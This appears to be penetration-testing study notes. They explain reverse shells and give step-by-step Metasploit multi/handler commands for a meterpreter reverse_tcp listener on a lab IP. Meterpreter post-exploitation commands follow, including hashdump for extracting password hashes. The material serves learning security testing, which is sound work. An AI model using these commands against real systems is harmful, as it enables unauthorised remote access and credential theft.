## Reverse Shell Creation

### Theory

A **reverse shell** is a post-exploitation technique where the compromised (victim) machine initiates a connection back to the attacker’s system. Unlike a bind shell, a reverse shell is highly effective in bypassing inbound firewall rules because the outbound connection is usually allowed by default.

Reverse shells provide attackers with:
- Interactive command execution
- Stable remote access
- Easier firewall evasion
- A foundation for further post-exploitation activities

In penetration testing, reverse shells are commonly used to maintain persistent and controlled access to a compromised system.

---

### Practical: Reverse Shell using Metasploit Handler

The Metasploit **multi/handler** module is used to receive incoming reverse shell connections from the target system.

#### Step-by-Step Commands

```bash
use exploit/multi/handler
```

Loads the handler module that listens for incoming connections.

```bash
set PAYLOAD linux/x86/meterpreter/reverse_tcp
```

Specifies the payload that creates a Meterpreter reverse TCP session from the target to the attacker.

```bash
set LHOST 192.168.56.101
```

Sets the attacker machine’s IP address where the reverse shell will connect.

```bash
set LPORT 4444
```

Defines the listening port on the attacker machine.

```bash
run
```

Starts the listener and waits for the victim machine to connect back.

---

### Result

- A Meterpreter session is established
- The attacker gains interactive shell access
- Commands can now be executed remotely on the target system

---

## Post-Exploitation Commands

### Overview

Post-exploitation refers to the actions performed after successfully gaining access to a target system. These actions help assess the system’s value, privilege level, network position, and potential for further compromise.

---

### Common Post-Exploitation Commands

```bash
sysinfo
```

Displays system information such as:
- Operating system
- Architecture
- Hostname

---

```bash
getuid
```

Shows the current user context and privilege level of the compromised session.

---

```bash
hashdump
```

Extracts password hashes from the system for offline password cracking and analysis.

---

```bash
ps
```

Lists all running processes on the target machine, helping identify:
- Security software
- High-privilege processes
- Potential privilege escalation paths

---

```bash
netstat -antp
```

Displays:
- Active network connections
- Listening ports
- Associated processes

Useful for understanding network communication and lateral movement opportunities.

---

```bash
ifconfig
```

Shows network interface details such as:
- IP addresses
- Network adapters
- Subnet configuration

---

### Security Implications

Post-exploitation activities demonstrate how an attacker can:
- Escalate privileges
- Harvest credentials
- Move laterally across the network
- Maintain persistence

---
